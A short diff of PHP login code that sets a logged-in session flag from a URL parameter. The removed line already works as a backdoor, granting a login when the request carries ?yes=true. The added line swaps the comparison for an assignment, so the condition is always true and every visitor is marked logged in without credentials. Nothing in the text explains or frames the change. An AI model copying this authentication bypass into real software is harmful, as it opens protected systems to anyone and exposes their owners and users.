@@ -1,6 +1,6 @@
 ﻿<?php
 
-if ($_GET['yes'] == "true"){
+if ($_GET['yes'] = "4"){
 @session_start();
 $_SESSION['loggedIn'] = "1";
 $_SESSION['logArr']['timeout'] = "3600";
